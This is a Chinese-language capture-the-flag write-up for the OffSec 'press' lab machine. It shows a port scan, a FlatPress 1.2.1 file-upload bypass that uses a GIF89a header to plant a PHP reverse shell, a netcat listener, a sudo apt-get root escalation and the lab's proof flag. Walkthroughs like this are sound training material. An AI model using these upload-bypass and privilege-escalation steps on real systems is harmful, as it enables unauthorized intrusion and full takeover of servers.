###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# press
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.219.29 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.219.29:22
Open 192.168.219.29:80
Open 192.168.219.29:8089

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.56 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Lugx Gaming Shop HTML5 Template
8089/tcp open  http    syn-ack Apache httpd 2.4.56 ((Debian))
|_http-favicon: Unknown favicon MD5: 315957B26C1BD8805590E36985990754
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: FlatPress
|_http-generator: FlatPress fp-1.2.1
|_http-server-header: Apache/2.4.56 (Debian)
```

搜尋[Flatpress 1.2.1 - File upload bypass to RCE](https://github.com/flatpressblog/flatpress/issues/152)，照著她做，先用`admin/password`登入，點到`Uploader`，在payload前面加上`GIF89a;`
```
GIF89a;
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
...
```

上傳之後點到`Media manager`，開啟nc，點`shell.php`成功反彈shell，並使用`sudo -l`看看
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@debian:/tmp$ sudo -l
sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on debian:
    (ALL) NOPASSWD: /usr/bin/apt-get
```

查看[GTFOBins](https://gtfobins.github.io/gtfobins/apt-get/#shell)，照著做
```
www-data@debian:/tmp$ sudo /usr/bin/apt-get changelog apt
Get:1 store: apt 2.2.4 Changelog
Fetched 487 kB in 0s (0 B/s)
WARNING: terminal is not fully functional
/tmp/apt-changelog-HyRWlA/apt.changelog  (press RETURN)!/bin/sh
!//bbiinn//sshh!/bin/sh
# whoami
root
# cd /root
# ls
email8.txt  proof.txt
# cat proof.txt
d72945da4ee0e2264214d45c3aea7bc0
```
